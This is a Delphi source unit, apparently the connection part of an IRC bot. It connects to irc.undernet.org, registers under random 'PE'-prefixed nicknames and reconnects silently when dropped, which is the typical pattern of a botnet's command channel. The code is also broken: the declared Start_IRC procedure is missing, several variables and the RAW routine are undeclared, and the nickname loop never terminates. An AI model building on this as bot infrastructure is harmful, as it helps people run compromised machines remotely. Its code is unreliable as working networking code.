   unit ircbpt;

   interface

   Uses
    Windows, Winsock;

    Procedure Start_IRC;

   implementation

   FUNCTION getip(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   procedure Startup;
   var
    ab,nick:string;
    i,h:integer;
    begin    //Starts the socket and trys to connect.
     ab := 'abcdefghijklmnopqrstuvwxyz0123456789';
     WSAStartup(257,WSAData);
     SockInfo.sin_family:=PF_INET;
     SockInfo.sin_port:=htons(6667);
     SockInfo.sin_addr.S_addr:= inet_addr(PChar(getip('irc.undernet.org')));
     Sock1:= socket(PF_INET,SOCK_STREAM,0);
     Connect(Sock1,SockInfo,sizeof(SockInfo));
     randomize;
     h:=random(8);
     for i:=h downto 0 do NICK:=NICK+copy(ab,random(length(ab)),1);
     RAW('USER '+NICK+' '+NICK+'@foo.bar '+NICK+' '+NICK+#13#10);
     nick := '';
     Randomize;
     while length(nick) < 6 do
      nick := inttostr(random(9));
     nick := 'PE'+nick;
     RAW('NICK '+nick+#13#10);
    end;

   Procedure Restart;
    begin     //Hence the name, restarts if it cant connect, or gets disconnected.
     Shutdown(Sock1,2);
     CloseSocket(Sock1);
     Sleep(5000);
     StartUp;
    end;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;



   end.

